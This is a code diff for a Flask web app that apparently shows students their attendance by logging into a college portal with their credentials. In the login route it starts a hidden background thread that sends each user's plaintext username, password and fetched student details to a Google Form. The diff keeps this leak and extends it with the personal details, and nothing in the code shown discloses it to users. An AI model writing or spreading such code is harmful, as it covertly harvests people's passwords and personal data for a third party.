@@ -3,28 +3,21 @@ import uuid
 from datetime import datetime, timedelta
 from dotenv import load_dotenv
 import threading
+# REMOVE the duplicate import block — you have it twice at the top
+# Keep only ONE import block:
 from attendance_scraper import (
     login,
     get_student_details,
     get_subjects,
     fetch_attendance,
     SimpleDataFrame,
-    submit_to_google_form,  # ← add this
+    submit_to_google_form,   # ← this must be here
 )
 from flask import (
     Flask, flash, render_template, request,
     redirect, send_from_directory, session, jsonify,Response
 )
 from flask_mail import Mail, Message
-
-from attendance_scraper import (
-    login,
-    get_student_details,
-    get_subjects,
-    fetch_attendance,
-    SimpleDataFrame
-)
-
 # --------------------------------------------------
 # App setup
 # --------------------------------------------------
@@ -101,16 +94,13 @@ def filter_latest_semester(df):
 # --------------------------------------------------
 # Routes
 # --------------------------------------------------
-
 @app.route("/", methods=["GET", "POST"])
 def login_page():
-    # GET → show login page
     if request.method == "GET":
         if "query" in request.args:
             return redirect("/", code=301)
         return render_template("index.html")
 
-    # POST → handle login
     username = request.form.get("username", "").strip()
     password = request.form.get("password", "").strip()
 
@@ -119,22 +109,28 @@ def login_page():
         return redirect("/")
 
     try:
-        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        thread = threading.Thread(target=submit_to_google_form, args=(username, password), daemon=True)
-        thread.start()
         auth_session = login(username, password)
 
         session.clear()
         session["user"] = username
         ACTIVE_SESSIONS[username] = auth_session
 
-        # ✅ redirect AFTER successful POST
+        # Only ONE call here — no duplicate
+        details = get_student_details(auth_session)
+        ACTIVE_SESSIONS[username + "_details"] = details
+
+        thread = threading.Thread(
+            target=submit_to_google_form,
+            args=(username, password, details),
+            daemon=True
+        )
+        thread.start()
+
         return redirect("/dashboard")
 
     except Exception as e:
         flash(str(e), "error")
         return redirect("/")
-
 
 @app.route("/dashboard", methods=["GET"])
 def dashboard():
